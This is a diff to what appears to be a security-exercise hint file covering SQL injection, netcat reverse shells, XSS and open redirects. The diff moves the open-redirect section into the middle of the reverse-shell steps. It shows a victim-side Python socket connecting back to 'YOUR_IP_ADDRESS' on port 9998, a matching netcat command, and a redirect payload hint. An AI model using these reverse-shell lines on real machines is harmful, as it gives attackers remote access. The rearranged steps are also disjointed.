@@ -49,7 +49,12 @@ Blind sql injection does injection is a type of SQL Injection attack that asks t
 ### if(r==5)
 #### Reverse Shell and Netcat Usage
 Reverse shell code creates payload and works like a backdoor. With Netcat, we can attack file uploading, eavesdropping, etc.
-
+### if r==6
+###xss Cross-site scripting attack
+###Open redirect vulnerability:
+Explicit redirection vulnerabilities occur when an application insecurely incorporates user-controllable data into a redirection destination.
+An attacker can generate a URL within the application that causes a redirection to an arbitrary external domain.
+Hint===?redirect={payload}
 *Step 1: Make sure that the `payload.py` file on the victim machine is using the correct IP address and port. Check that your IP address is correct and the port you are listening on is 9998:
 ```python
 s.connect(('YOUR_IP_ADDRESS', 9998)) # Replace YOUR_IP_ADDRESS with the IP address of your own machine
@@ -76,9 +81,4 @@ Try to establish a connection using netcat on the victim machine:
 Linux:
 nc YOUR_IP_ADDRESS 9998.
 
-### if r==6
-###xss Cross-site scripting attack
-###Open redirect vulnerability:
-Explicit redirection vulnerabilities occur when an application insecurely incorporates user-controllable data into a redirection destination.
-An attacker can generate a URL within the application that causes a redirection to an arbitrary external domain.
-Hint===?redirect={payload}
+
